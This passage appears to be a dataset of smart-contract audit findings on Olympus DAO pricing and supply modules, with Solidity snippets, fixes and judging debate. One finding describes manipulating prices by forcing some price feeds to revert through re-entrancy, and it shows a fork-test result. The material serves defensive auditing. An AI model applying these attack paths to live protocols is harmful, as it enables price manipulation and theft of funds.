Balancer_PoolStableRateInvalid(poolId, 0);\n                }\n\n\n                poolRate = rate_;\n\n        // rest of code// rest of code\n\n        uint256 minimumPrice; // outputDecimals_\n        {\n            /**\n             * The Balancer docs do not currently state this, but a historical version noted\n             * that getRate() should be multiplied by the minimum price of the tokens in the\n             * pool in order to get a valuation. This is the same approach as used by Curve stable pools.\n             */\n            for (uint256 i; i < len; i++) {\n                address token = tokens[i];\n                if (token == address(0)) revert Balancer_PoolTokenInvalid(poolId, i, token);\n\n                (uint256 price_, ) = _PRICE().getPrice(token, PRICEv2.Variant.CURRENT); // outputDecimals_\n\n\n                if (minimumPrice == 0) {\n                    minimumPrice = price_;\n                } else if (price_ < minimumPrice) {\n                    minimumPrice = price_;\n                }\n            }\n        }\n\n        uint256 poolValue = poolRate.mulDiv(minimumPrice, 10 ** poolDecimals); // outputDecimals_\n```\n\nThe `getRate()` function returns the exchange `rate` of a BPT to the underlying base asset of the pool which can be different from the minimum market priced asset for pools with `rateProviders`. To consider this, the price obtained from feeds must be divided by the `rate` provided by `rateProviders` before choosing the minimum as mentioned in the previous version of Balancer's documentation.\nhttps://github.com/balancer/docs/blob/663e2f4f2c3eee6f85805e102434629633af92a2/docs/concepts/advanced/valuing-bpt/bpt-as-collateral.md#metastablepools-eg-wsteth-weth\n1. Get market price for each constituent token\nGet market price of wstETH and WETH in terms of USD, using chainlink oracles.\n2. Get RateProvider price for each constituent token\nSince wstETH - WETH pool is a MetaStablePool and not a ComposableStablePool, it does not have `getTokenRate()` function. Therefore, it`s needed to get the RateProvider price manually for wstETH, using the rate providers of the pool. The rate provider will return the wstETH token in terms of stETH.\nNote that WETH does not have a rate provider for this pool. In that case, assume a value of `1e18` (it means, market price of WETH won't be divided by any value, and it's used purely in the minPrice formula).\n3. Get minimum price\n$$ minPrice = min({P_{M_{wstETH}} \over P_{RP_{wstETH}}}, P_{M_{WETH}}) $$\n4. Calculates the BPT price\n$$ P_{BPT_{wstETH-WETH}} = minPrice * rate_{pool_{wstETH-WETH}} $$\nwhere `rate_pool_wstETH-WETH` is `pool.getRate()` of wstETH-WETH pool.\nExample\nThe wstEth-cbEth pool is a MetaStablePool having rate providers for both tokens since neither of them is the base token https://app.balancer.fi/#/ethereum/pool/0x9c6d47ff73e0f5e51be5fd53236e3f595c5793f200020000000000000000042c\nAt block 18821323: cbeth : 2317.48812 wstEth : 2526.84 pool total supply : 0.273259897168240633 getRate() : 1.022627523581711856 wstRateprovider rate : 1.150725009180224306 cbEthRateProvider rate : 1.058783029570983377 wstEth balance : 0.133842314907166538 cbeth balance : 0.119822100236557012 tvl : (0.133842314907166538 * 2526.84 + 0.119822100236557012 * 2317.48812) == 615.884408812\naccording to current implementation: bpt price = 2317.48812 * 1.022627523581711856 == 2369.927137086 calculated tvl = bpt price * total supply = 647.606045776\ncorrect calculation: rate_provided_adjusted_cbeth = (2317.48812 / 1.058783029570983377) == 2188.822502132 rate_provided_adjusted_wsteth = (2526.84 / 1.150725009180224306) == 2195.867804942 bpt price = 2188.822502132 * 1.022627523581711856 == 2238.350134915 calculated tvl = bpt price * total supply = (2238.350134915 * 0.273259897168240633) == 611.651327693чFor pools having rate providers, divide prices by rate before choosing the minimum\nDiscussion\n0xJem\nThis is a valid issue and highlights problems with Balancer's documentation.\nWe are likely to drop both the Balancer submodules from the final version, since we no longer have any Balancer pools used for POL and don't have any assets that require price resolution via Balancer pools.\nsherlock-admin2\n```\nYou've deleted an escalation for this issue.\n```\nчIncorrect calculation of bpt price. Has possibility to be over and under valued.\nCode Snippet\nTool used\nManual Review
Inconsistency in BunniToken Price Calculationчmediumч```\n    function _getTotalValue(\n        BunniToken token_,\n        BunniLens lens_,\n        uint8 outputDecimals_\n    ) internal view returns (uint256) {\n        (address token0, uint256 reserve0, address token1, uint256 reserve1) = _getBunniReserves(\n            token_,\n            lens_,\n            outputDecimals_\n        );\n        uint256 outputScale = 10 ** outputDecimals_;\n\n        // Determine the value of each reserve token in USD\n        uint256 totalValue;\n        totalValue += _PRICE().getPrice(token0).mulDiv(reserve0, outputScale);\n        totalValue += _PRICE().getPrice(token1).mulDiv(reserve1, outputScale);\n\n        return totalValue;\n    }\n```\nчBut this could lead to a misalignment between the deviation check and actual price computation.\nDeviation Check : `_validateReserves` Function:\nYou can see that the deviation check includes uncollected fees in the `reservesTokenRatio`, potentially leading to a higher or more volatile ratio compared to the historical `twapTokenRatio`.\n```\n    function _getTotalValue(\n        BunniToken token_,\n        BunniLens lens_,\n        uint8 outputDecimals_\n    ) internal view returns (uint256) {\n        (address token0, uint256 reserve0, address token1, uint256 reserve1) = _getBunniReserves(\n            token_,\n            lens_,\n            outputDecimals_\n        );\n        uint256 outputScale = 10 ** outputDecimals_;\n\n        // Determine the value of each reserve token in USD\n        uint256 totalValue;\n        totalValue += _PRICE().getPrice(token0).mulDiv(reserve0, outputScale);\n        totalValue += _PRICE().getPrice(token1).mulDiv(reserve1, outputScale);\n\n        return totalValue;\n    }\n```\n\nYou can see that this function (_getTotalValue()) excludes uncollected fees in the final valuation, potentially overestimating the total value within deviation check process, meaning the check could pass in certain conditions whereas it could have not pass if fees where not accounted on the deviation check. Moreover the below formula used :\n$$ price_{LP} = {reserve_0 \times price_0 + reserve_1 \times price_1} $$\nwhere $reserve_i$ is token $i$ reserve amount, $price_i$ is the price of token $i$\nIn short, it is calculated by getting all underlying balances, multiplying those by their market prices\nHowever, this approach of directly computing the price of LP tokens via spot reserves is well-known to be vulnerable to manipulation, even if TWAP Deviation is checked, the above summary proved that this method is not 100% bullet proof as there are discrepancy on what is mesured. Taken into the fact that the process to check deviation is not that good plus the fact that methodology used to compute price is bad, the impact of this is high\n```\n    function getProtocolOwnedLiquidityReserves()\n        external\n        view\n        override\n        returns (SPPLYv1.Reserves[] memory)\n    {\n        // Iterate through tokens and total up the reserves of each pool\n        uint256 len = bunniTokens.length;\n        SPPLYv1.Reserves[] memory reserves = new SPPLYv1.Reserves[](len);\n        for (uint256 i; i < len; ) {\n            TokenData storage tokenData = bunniTokens[i];\n            BunniToken token = tokenData.token;\n            BunniLens lens = tokenData.lens;\n            BunniKey memory key = _getBunniKey(token);\n            (\n                address token0,\n                address token1,\n                uint256 reserve0,\n                uint256 reserve1\n            ) = _getReservesWithFees(key, lens);\n\n            // Validate reserves\n            _validateReserves(\n                key,\n                lens,\n                tokenData.twapMaxDeviationBps,\n                tokenData.twapObservationWindow\n            );\n\n            address[] memory underlyingTokens = new address[](2);\n            underlyingTokens[0] = token0;\n            underlyingTokens[1] = token1;\n            uint256[] memory underlyingReserves = new uint256[](2);\n            underlyingReserves[0] = reserve0;\n            underlyingReserves[1] = reserve1;\n\n            reserves[i] = SPPLYv1.Reserves({\n                source: address(token),\n                tokens: underlyingTokens,\n                balances: underlyingReserves\n            });\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        return reserves;\n    }\n```\n\nWhere returned value does not account for uncollected fees whereas deviation check was accounting for itчAlign the methodology used in both the deviation check and the final price computation. This could involve either including the uncollected fees in both calculations or excluding them in both.\nIt's ok for BunniSupply as there are 2 functions handling both reserves and reserves+fees but change deviation check process on the second one to include only reserves when checking deviation twap ratio\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\nnirohgo commented:\nTrue observation but the effect on deviation is miniscule and no viable scenario has been shown that leads to a loss of material amounts.\n0xJem\nAccurate that uncollected fees are excluded from the TWAP check but included in the reserves check, which could lead to inconsistencies. This has been made consistent now.\nthis approach of directly computing the price of LP tokens via spot reserves is well-known to be vulnerable to manipulation\nWe are aware, hence the reserves & TWAP check, plus re-entrancy check.\n0xrusowsky\nhttps://github.com/OlympusDAO/bophades/pull/244 https://github.com/OlympusDAO/bophades/pull/246\nIAm0x52\nFix looks good. Fees are now included in determining bunni token price. Fees are now not considered in BunniHelper#getFullRangeBunniKeyчCode Snippet\nTool used\nManual Review
Price can be miscalculated.чmediumч```\n    function getMedianPriceIfDeviation(\n        uint256[] memory prices_,\n        bytes memory params_\n    ) public pure returns (uint256) {\n        // Misconfiguration\n        if (prices_.length < 3) revert SimpleStrategy_PriceCountInvalid(prices_.length, 3);\n\n237     uint256[] memory nonZeroPrices = _getNonZeroArray(prices_);\n\n        // Return 0 if all prices are 0\n        if (nonZeroPrices.length == 0) return 0;\n\n        // Cache first non-zero price since the array is sorted in place\n        uint256 firstNonZeroPrice = nonZeroPrices[0];\n\n        // If there are not enough non-zero prices to calculate a median, return the first non-zero price\n246     if (nonZeroPrices.length < 3) return firstNonZeroPrice;\n\n        uint256[] memory sortedPrices = nonZeroPrices.sort();\n\n        // Get the average and median and abort if there's a problem\n        // The following two values are guaranteed to not be 0 since sortedPrices only contains non-zero values and has a length of 3+\n        uint256 averagePrice = _getAveragePrice(sortedPrices);\n253     uint256 medianPrice = _getMedianPrice(sortedPrices);\n\n        if (params_.length != DEVIATION_PARAMS_LENGTH) revert SimpleStrategy_ParamsInvalid(params_);\n        uint256 deviationBps = abi.decode(params_, (uint256));\n        if (deviationBps <= DEVIATION_MIN || deviationBps >= DEVIATION_MAX)\n            revert SimpleStrategy_ParamsInvalid(params_);\n\n        // Check the deviation of the minimum from the average\n        uint256 minPrice = sortedPrices[0];\n262     if (((averagePrice - minPrice) * 10000) / averagePrice > deviationBps) return medianPrice;\n\n        // Check the deviation of the maximum from the average\n        uint256 maxPrice = sortedPrices[sortedPrices.length - 1];\n266     if (((maxPrice - averagePrice) * 10000) / averagePrice > deviationBps) return medianPrice;\n\n        // Otherwise, return the first non-zero value\n        return firstNonZeroPrice;\n    }\n```\nч```\n    function getMedianPriceIfDeviation(\n        uint256[] memory prices_,\n        bytes memory params_\n    ) public pure returns (uint256) {\n        // Misconfiguration\n        if (prices_.length < 3) revert SimpleStrategy_PriceCountInvalid(prices_.length, 3);\n\n237     uint256[] memory nonZeroPrices = _getNonZeroArray(prices_);\n\n        // Return 0 if all prices are 0\n        if (nonZeroPrices.length == 0) return 0;\n\n        // Cache first non-zero price since the array is sorted in place\n        uint256 firstNonZeroPrice = nonZeroPrices[0];\n\n        // If there are not enough non-zero prices to calculate a median, return the first non-zero price\n246     if (nonZeroPrices.length < 3) return firstNonZeroPrice;\n\n        uint256[] memory sortedPrices = nonZeroPrices.sort();\n\n        // Get the average and median and abort if there's a problem\n        // The following two values are guaranteed to not be 0 since sortedPrices only contains non-zero values and has a length of 3+\n        uint256 averagePrice = _getAveragePrice(sortedPrices);\n253     uint256 medianPrice = _getMedianPrice(sortedPrices);\n\n        if (params_.length != DEVIATION_PARAMS_LENGTH) revert SimpleStrategy_ParamsInvalid(params_);\n        uint256 deviationBps = abi.decode(params_, (uint256));\n        if (deviationBps <= DEVIATION_MIN || deviationBps >= DEVIATION_MAX)\n            revert SimpleStrategy_ParamsInvalid(params_);\n\n        // Check the deviation of the minimum from the average\n        uint256 minPrice = sortedPrices[0];\n262     if (((averagePrice - minPrice) * 10000) / averagePrice > deviationBps) return medianPrice;\n\n        // Check the deviation of the maximum from the average\n        uint256 maxPrice = sortedPrices[sortedPrices.length - 1];\n266     if (((maxPrice - averagePrice) * 10000) / averagePrice > deviationBps) return medianPrice;\n\n        // Otherwise, return the first non-zero value\n        return firstNonZeroPrice;\n    }\n```\n\nAs you can see above, on L237 it gets the list of non-zero prices. If the length of this list is smaller than 3, it assumes that a median price cannot be calculated and returns first non-zero price. This is wrong. If the number of non-zero prices is 2 and they are deviated, it has to return median value. The `_getMedianPrice` function called on L253 is as follows.\n```\n    function _getMedianPrice(uint256[] memory prices_) internal pure returns (uint256) {\n        uint256 pricesLen = prices_.length;\n\n        // If there are an even number of prices, return the average of the two middle prices\n        if (pricesLen % 2 == 0) {\n            uint256 middlePrice1 = prices_[pricesLen / 2 - 1];\n            uint256 middlePrice2 = prices_[pricesLen / 2];\n            return (middlePrice1 + middlePrice2) / 2;\n        }\n\n        // Otherwise return the median price\n        // Don't need to subtract 1 from pricesLen to get midpoint index\n        // since integer division will round down\n        return prices_[pricesLen / 2];\n    }\n```\n\nAs you can see, the median value can be calculated from two values. This problem exists at `getMedianPrice` function as well.\n```\n    function getMedianPrice(uint256[] memory prices_, bytes memory) public pure returns (uint256) {\n        // Misconfiguration\n        if (prices_.length < 3) revert SimpleStrategy_PriceCountInvalid(prices_.length, 3);\n\n        uint256[] memory nonZeroPrices = _getNonZeroArray(prices_);\n\n        uint256 nonZeroPricesLen = nonZeroPrices.length;\n        // Can only calculate a median if there are 3+ non-zero prices\n        if (nonZeroPricesLen == 0) return 0;\n        if (nonZeroPricesLen < 3) return nonZeroPrices[0];\n\n        // Sort the prices\n        uint256[] memory sortedPrices = nonZeroPrices.sort();\n\n        return _getMedianPrice(sortedPrices);\n    }\n```\nч```\n    function getMedianPriceIfDeviation(\n        uint256[] memory prices_,\n        bytes memory params_\n    ) public pure returns (uint256) {\n        // Misconfiguration\n        if (prices_.length < 3) revert SimpleStrategy_PriceCountInvalid(prices_.length, 3);\n\n        uint256[] memory nonZeroPrices = _getNonZeroArray(prices_);\n\n        // Return 0 if all prices are 0\n        if (nonZeroPrices.length == 0) return 0;\n\n        // Cache first non-zero price since the array is sorted in place\n        uint256 firstNonZeroPrice = nonZeroPrices[0];\n\n        // If there are not enough non-zero prices to calculate a median, return the first non-zero price\n-       if (nonZeroPrices.length < 3) return firstNonZeroPrice;\n+       if (nonZeroPrices.length < 2) return firstNonZeroPrice;\n\n        // rest of code\n    }\n```\n\n```\n    function getMedianPrice(uint256[] memory prices_, bytes memory) public pure returns (uint256) {\n        // Misconfiguration\n        if (prices_.length < 3) revert SimpleStrategy_PriceCountInvalid(prices_.length, 3);\n\n        uint256[] memory nonZeroPrices = _getNonZeroArray(prices_);\n\n        uint256 nonZeroPricesLen = nonZeroPrices.length;\n        // Can only calculate a median if there are 3+ non-zero prices\n        if (nonZeroPricesLen == 0) return 0;\n-       if (nonZeroPricesLen < 3) return nonZeroPrices[0];\n+       if (nonZeroPricesLen < 2) return nonZeroPrices[0];\n\n        // Sort the prices\n        uint256[] memory sortedPrices = nonZeroPrices.sort();\n\n        return _getMedianPrice(sortedPrices);\n    }\n```\n\nDiscussion\n0xJem\nAgree with the highlighted issue, disagree with the proposed solution.\n0xJem\nhttps://github.com/OlympusDAO/bophades/pull/282\nIAm0x52\nFix looks good. Now falls back to getAveragePriceIfDeviation() instead of returning first.чWhen the length of `nonZeroPrices` is 2 and they are deviated, it returns first non-zero value, not median value. It causes wrong calculation error.\nCode Snippet\nTool used\nManual Review
Price calculation can be manipulated by intentionally reverting some of price feeds.чmediumч```\n// Get the current price of the lookup token in terms of the quote token\n(, int24 currentTick, , , , , bool unlocked) = params.pool.slot0();\n\n// Check for re-entrancy\nif (unlocked == false) revert UniswapV3_PoolReentrancy(address(params.pool));\n```\nчPrice calculation module iterates through available price feeds for the requested asset, gather prices of non-revert price feeds and then apply strategy on available prices to calculate final asset price. By abusing this functionality, an attacker can let some price feeds revert to get advantage from any manipulated price feed.\nHere we have some methods that attackers can abuse to intentionally revert price feeds.\n```\n// Get the current price of the lookup token in terms of the quote token\n(, int24 currentTick, , , , , bool unlocked) = params.pool.slot0();\n\n// Check for re-entrancy\nif (unlocked == false) revert UniswapV3_PoolReentrancy(address(params.pool));\n```\n\nIn UniswapV3 price feed, it reverts if current state is re-entered. An attacker can intentionally revert this price feed by calling it from UniswapV3's callback methods.\n```\n// Prevent re-entrancy attacks\nVaultReentrancyLib.ensureNotInVaultContext(balVault);\n```\n\nIn BalancerPool price feed, it reverts if current state is re-entered. An attacker can intentionally revert this price feed by calling it in the middle of Balancer action.\n```\n_validateReserves(\n    _getBunniKey(token),\n    lens,\n    params.twapMaxDeviationsBps,\n    params.twapObservationWindow\n);\n```\n\nIn BunniToken price feed, it validates reserves and reverts if it doesn't satisfy deviation. Since BunniToken uses UniswapV3, this can be intentionally reverted by calling it from UniswapV3's mint callback.\n\nUsually for ERC20 token prices, above 3 price feeds are commonly used combined with Chainlink price feed, and optionally with `averageMovingPrice`. There are another two points to consider here:\n```\nif (asset.useMovingAverage) prices[numFeeds] = asset.cumulativeObs / asset.numObservations;\n```\n\n\nBased on the information above, here are potential attack vectors that attackers would try:\nWhen Chainlink price feed is manipulated, an attacker can disable all three above price feeds intentionally to get advantage of the price manipulation.\nWhen Chainlink price feed is not used for an asset, an attacker can manipulate one of above 3 spot price feeds and disable other ones.\nWhen `averageMovingPrice` is used and average price strategy is applied, the manipulation effect becomes half: $\frac{(P + \Delta X) + (P)}{2} = P + \frac{\Delta X}{2}, P=Market Price, \Delta X=Manipulated Amount$ч"For the cases above that price feeds being intentionally reverted, the price calculation itself also should revert without just ignoring it.\nDiscussion\nnevillehuang\nInvalid, if a user purposely revert price feeds, they are only affecting their own usage, not the usage of price feeds for other users transactions.\nKupiaSecAdmin\nEscalate\nHey @nevillehuang - Yes, exactly you are right. What an attacker can manipulate is a spot price using flashloans, so if an attacker purposely disable other price feeds but only leave manipulated price feed, there happens a vulnerability that an attacker can buy tokens at affected price.\nsherlock-admin2\nEscalate\nHey @nevillehuang - Yes, exactly you are right. What an attacker can manipulate is a spot price using flashloans, so if an attacker purposely disable other price feeds but only leave manipulated price feed, there happens a vulnerability that an attacker can buy tokens at affected price.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nnevillehuang\n@KupiaSecAdmin, All of your scenarios are invalid\nThere is no point for somebody to reenter to explicity cause a revert for using the price feed himself\nSame reason as 1.\nThere is no point for somebody to cause a deviation to explicity cause a revert for using the price feed himself\nA user cannot manipulate a chainlink price feed since there are no reserves\nThis is on top of the fact that price submodules are not intended to be called directly, but via the primary price module mentioned in this comment here\nKupiaSecAdmin\n@nevillehuang - For example, you can manipulate spot price of Uniswap. To make this work, you need to make other price feeds revert because if they are all enabled, average/median price strategy will be taken and manipulated spot price will not take effect.\nnevillehuang\n@KupiaSecAdmin you cannot make other feeds revert for other user, only yourself, and your submission certainly doesn't prove that it is possible. Besides, to manipulate spot price in uniswap, you will have to manipulate the reserves, which is a known issue in the contest and out of scope.\nKupiaSecAdmin\n@nevillehuang - I would like to add some notes and scenarios below that I think might be attack vectors. @0xJem - I would be happy to get some feedbacks from the protocol team regarding the issue.\n[Notes]\n(I believe) This price module will be used in other parts of Olympus protocol to determine fair price of OHM(and other ERC20 tokens) at any time by integrating multiple price feeds and applying a strategy(average or median) to different prices to carry out final fair price.\nThe carried out final price will be used to buy/sell OHM tokens using other collaterals in other modules of Olympus protocol.\n[Scenario]\nLet's assume that an attacker can manipulate a spot price of one price feed, e.g. Uni2, Uni3, Bunni. It can not be guaranteed that all spot price feeds work correctly.\nAs a result, we can assume that the attacker can manipulate OHM price of one price feed to $9(for example by manipulating Bunni).\nHowever, multiple price feeds are used to calculate fair OHM price, for example, 3 strategies can be used to determine fair OHM price: Chainlink, Uniswap3, Bunni. Thus assume Chainlink returns $11.1 and Uniswap3 returns $11.05 for OHM price.\nThe price strategy takes median strategy, this means manipulating Bunni price feeds does not take effect on final OHM price determination because the median price of ($9, $11.05, $11.1) is $11.05 which could be accepted as fair OHM price.\nNow, the attacker can intentionally make Uniswap 3 price feed reverting using re-entrancy.\nWhen this happens, the only available price feeds are Chainlink and Bunny which are $9 and $11.1. Median price strategy is applied to these feeds thus returning $10 as OHM price, which is affected and this could result in attacker can buy more OHM tokens than expected.\n[Thoughts] Price feeds can revert for any reason by accidents so it would actually make sense using try/catch to ignore reverted price feeds. However, price feeds being reverted because of re-entrancy check can not be considered as accidents because it's intentional and unusual behavior. So I think it's the right behavior to revert price calculation itself as a whole when any price feed is reverted by re-entrancy check.\n[Claims] @nevillehuang - You were mentioning that I can not make other feeds revert for other users but only for myself. Yes, that's right. An attacker will let some price feeds revert only for himself(and only within a single transaction, they should work fine in other transactions), and it is to manipulate final fair price of tokens regardless of whatever strategy is taken.\nnevillehuang\n@KupiaSecAdmin Can you provide a coded PoC for your above scenario? I really don't see how step 5 can occur, given price feeds are utilized in separate transactions? How would one users price feed reverting affect another?\nNow, the attacker can intentionally make Uniswap 3 price feed reverting using re-entrancy.\nKupiaSecAdmin\nRunning test: `forge test --fork-url {{MAINNET_RPC}} --fork-block-number 19041673 --match-test testPriceManipulation -vv`\nResult:\n```\n[PASS] testPriceManipulation() (gas: 2299239)\nLogs:\n  Before: Chainklink/Olympus 6294108760000000000 6308514491323687440\n  After: Chainklink/Olympus 6294108760000000000 29508079057029841191\n\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.69s\n \nRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n[Scenario]\nIt calculates UNI price using mainnet's forked data.\nIt is assumed that Olympus uses UniV2 and UniV3 price feeds for calculating UNI price.\nThe test manipulates UniV2 price and intentionally reverts UniV3 price feed, thus the final price is same as manipulated UniV2 price.\n[Focus]\nEven though test shows price manipulation is done via reserves, but reserve manipulation is not the only way of manipulating price, as Olympus integrates further more price feeds and based on protocols.\nThe main point to show from the issue and PoC is that intentionally reverting some price feeds is dangerous because that can be a cause of price manipulation.\n0xJem\n@Oighty can you weigh in on the risk of a third-party deliberately triggering the re-entrancy lock in the UniV3 pool?\nTo me, this represents a misconfiguration of the asset price feeds.\nIf it was a single price feed (UniV3) only, it would be fine, as the price lookup would fail. It's because there's a UniV2 pool in use that this could be susceptible to the price manipulation as you described. However, this feels unlikely because:\nThe depth of liquidity on the UNI / WETH UniV2 pool is $4.32m, which feels too low for a UniV3 pool (let alone UniV2!), and so we'd be unlikely to use it.\nFor an asset that does not have as much liquidity (e.g. we are following this approach for FXS), we track an internal MA and use that, which ensures that any manipulation is smoothed out.\nIf we were to have UNI defined as an asset, we would be more likely to do this:\nUNI/ETH Chainlink feed\nUNI/wETH UniV3 pool with TWAP\nGiven the difficulty of manipulation both sources, and the deep liquidity of the UniV3 pool ($31.65m), we'd be confident that it would be resilient enough.\nnevillehuang\nUNI wasn't mentioned as an integrated token in the contest details, so wouldn't this be invalid?\nOlympus also has many mitigations in place for TWAP manipulation\nCzar102\nI think this is a really nice finding if true, kudos for the thought process @KupiaSecAdmin!\nSince price manipulation itself is out of scope, but the expectation of using multiple price sources should make the price more difficult to manipulate, and because of the bug, the breakdown value falls drastically. Thus I believe it deserves to be a valid Medium.\nI'm not sure about the point above, @0xJem could you explain why would such setup be a misconfiguration? From my understanding, any setup using any of these 3 oracles and any other one will be susceptible to manipulation.\nnevillehuang\n@Czar102 Some questions:\nIs there anywhere it was indicated that the above uni pools would be used as price feeds? Given the watson made an assumption:\nassumed that Olympus uses UniV2 and UniV3 price feeds for calculating UNI price.\nIsn't the additional data provided by the watson still related to manipulation of reserves and like you said out of scope? To me he still hasn't prove that there is any other cause other than manipulating reserves other than stating a possibility? Would be nice if he can prove this issues above scenario of 1 and 2 (reentrancy triggering affecting price feed of other users?)\nDont Olympus use an internal MA to mitigate risk of reserve manipulation?\n0xJem\nI'm not sure about the point above, @0xJem could you explain why would such setup be a misconfiguration? From my understanding, any setup using any of these 3 oracles and any other one will be susceptible to manipulation.\nGiven the risk of a single price feed reverting (causing the 2nd price feed to be used), we would not use a UniV2 (which doesn't have re-entrancy protection and is much more susceptible to manipulation) pool as the second feed.\nInstead of this UniV3 + UniV3 combination, if we were to configure in PRICE for this asset, we would do a Chainlink feed (e.g. UNI-USD, no idea if it exists) and a UniV3 pool.\nCzar102\n@nevillehuang I believe the assumption you are mentioning in point 1 is just an example and the different price feeds could be anything, like Uni v3 + Uni v3 – one could manipulate one of these and make the other revert, for example.\nRegarding point 2, I don't think the crux here is the manipulation of reserves, they may be just off with respect to each other. The point is that the attacker can selectively decide which sources of information to use, impacting the final price reading. The point of using multiple feeds is to make the price more reliable, and they are being made less reliable if you can make the readings be rejected.\nRegarding point 3, I believe you could repetitively make the price pass sanity checks, making it exponentially diverge from the real price.\nRegarding @0xJem's points: I believe simply not using a Uni v2 pool doesn't mitigate this. Using any of the dexes mentioned above together with any feed will have this impact. So, a Chainlink feed + Uni v3 pool could be exploited in a way that the Uni v3 reading will revert and only Chainlink feed will be used, which may benefit the attacker in a certain way.\nHas the approach for creating these safe setups been shared with Watsons anywhere? Am I misunderstanding something? @0xJem @nevillehuang @KupiaSecAdmin\nnevillehuang\n@Czar102\nWhat is the cost of manipulating such price feeds, is it even profitable for the user?\nThe ORIGINAL issue certainly doesn't have sufficient proof to prove that anything other than manipulation of reserves will cause price feed revert or show that it is viable/economically viable. Until the watson prove to me with a reasonable PoC that it is possible, I cannot verify validity, especially not with information from the original submission. If a judge has to do alot of additional research apart from what is provided in the issue, it certainly doesn’t help too.\nIn case of non-obvious issues with complex vulnerabilities/attack paths, Watson must submit a valid POC for the issue to be considered valid and rewarded.\nThe watson is speculating on how protocol will configure and select different price feeds. Like @0xJem mentioned, this is protocol determined so the above mentioned possibilities are all possible assumptions. “Could be anything” is a weak argument and based off your previous statement here it doesn’t line up, given configurations of price feeds are not explicitly mentioned in docs\nTLDR, unless the watson or YOU provide sufficient proof (best with a PoC) that it is economically possible/profitable, I’m not convinced this is a valid issue since you are just simply stating possibility. Please only consider the original submission only and see if it has sufficient information in place during the time when Im judging this.\nHash01011122\nIMO In my opinion, while the precise impact of the potential attack isn't crystal clear, the mentioned attack path, extending up to price manipulation, significantly expands the attack surface. This broader surface introduces multiple avenues for potential attacks that may not be immediately apparent. I find @nevillehuang's comment lacking in persuasiveness, on how this issue should be considered as invalid after watson submitted the PoC. With a clear attack impact, Watson's submission should be rated as High severity. Watson's failure to articulate how the identified issue could result in a loss of funds for the protocol is crucial. But the issue highlights numerous ways the core functionality of the contract could be exploited, making it a valid medium-severity concern.\nnevillehuang\n@Hash01011122, stating the possibility of an issue and proving it are two separate things. Can you look at the details provided in the issue and tell me with at least 80% confidence rate that it is valid without additional research by the judge to prove its validity when its not the case?\nFor example, the watson is simply stating ""user can cause reentrancy"" with a single one liner type comment without any code description/POC (there are multiple instances throughout the issue)? How am I suppose to verify that? I am a firm believer that burden of proof is on the watson not the judge, and I believe sherlock also enforces this stance.\nThe fact that Head of judging and sponsor has to come in and supplement the non-obvious finding of the watson certainly doesn't help too, and I believe this will be resolved in the future now that we have the `request poc` feature, but I believe as of contest date, the information provided in the ORIGINAL submission is insufficient to warrant its severity other than low/invalid.\nCzar102\nI understood the finding when I haven't read a half or it. I think the only thing that needs to be verified is that a revert in price reading will cause the price to be computed based on other sources.\nSelective manipulation of sources of information defeats the purpose of sourcing the data from many sources – instead of increasing security, the data will be pulled from potentially least safe sources.\nI think it warrants Medium severity.\nnevillehuang\n@Czar102 ok got it I put it on myself for not having the knowledge u possess to understand this issue. I will let you decide once you decide what @0xJem considers. Again understanding and proving to issue is two separate issues for debate.\nCzar102\nResult: Medium Unique\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nKupiaSecAdmin: accepted"чAttackers can disable some of price feeds as they want with ease, they can get advantage of one manipulated price feed.\nCode Snippet\nTool used\nManual Review
getReservesByCategory() when useSubmodules =true and submoduleReservesSelector=bytes4(0) will revertчmediumч"```\n        _addCategory(toCategory(""protocol-owned-treasury""), true, 0xb600c5e2, 0x00000000); // getProtocolOwnedTreasuryOhm()`\n```\n"ч"in `getReservesByCategory()` Lack of check `data.submoduleReservesSelector!=""""` when call `submodule.staticcall(abi.encodeWithSelector(data.submoduleReservesSelector));` will revert\nwhen `_addCategory()` if `useSubmodules==true`, `submoduleMetricSelector` must not empty and `submoduleReservesSelector` can empty (bytes4(0))\nlike ""protocol-owned-treasury""\n```\n        _addCategory(toCategory(""protocol-owned-treasury""), true, 0xb600c5e2, 0x00000000); // getProtocolOwnedTreasuryOhm()`\n```\n\nbut when call `getReservesByCategory()` , don't check `submoduleReservesSelector!=bytes4(0)` and direct call `submoduleReservesSelector`\n```\n    function getReservesByCategory(\n        Category category_\n    ) external view override returns (Reserves[] memory) {\n// rest of code\n        // If category requires data from submodules, count all submodules and their sources.\n        len = (data.useSubmodules) ? submodules.length : 0;\n\n// rest of code\n\n        for (uint256 i; i < len; ) {\n            address submodule = address(_getSubmoduleIfInstalled(submodules[i]));\n            (bool success, bytes memory returnData) = submodule.staticcall(\n                abi.encodeWithSelector(data.submoduleReservesSelector)\n            );\n```\n\nthis way , when call like `getReservesByCategory(toCategory(""protocol-owned-treasury"")` will revert\nPOC\n```\n    function test_getReservesByCategory_includesSubmodules_treasury() public {\n        _setUpSubmodules();\n\n        // Add OHM/gOHM in the treasury (which will not be included)\n        ohm.mint(address(treasuryAddress), 100e9);\n        gohm.mint(address(treasuryAddress), 1e18); // 1 gOHM\n\n        // Categories already defined\n\n        uint256 expectedBptDai = BPT_BALANCE.mulDiv(\n            BALANCER_POOL_DAI_BALANCE,\n            BALANCER_POOL_TOTAL_SUPPLY\n        );\n        uint256 expectedBptOhm = BPT_BALANCE.mulDiv(\n            BALANCER_POOL_OHM_BALANCE,\n            BALANCER_POOL_TOTAL_SUPPLY\n        );\n\n        // Check reserves\n        SPPLYv1.Reserves[] memory reserves = moduleSupply.getReservesByCategory(\n            toCategory(""protocol-owned-treasury"")\n        );\n    }\n```\n"ч```\n    function getReservesByCategory(\n        Category category_\n    ) external view override returns (Reserves[] memory) {\n// rest of code\n\n\n        CategoryData memory data = categoryData[category_];\n        uint256 categorySubmodSources;\n        // If category requires data from submodules, count all submodules and their sources.\n// Remove the line below\n       len = (data.useSubmodules) ? submodules.length : 0;\n// Add the line below\n       len = (data.useSubmodules && data.submoduleReservesSelector!=bytes4(0)) ? submodules.length : 0;\n```\n\nDiscussion\n0xJem\nGood catch! Thank you for the clear explanation and test case, too.\n0xrusowsky\nhttps://github.com/OlympusDAO/bophades/pull/262\nIAm0x52\nFix looks good, exactly as 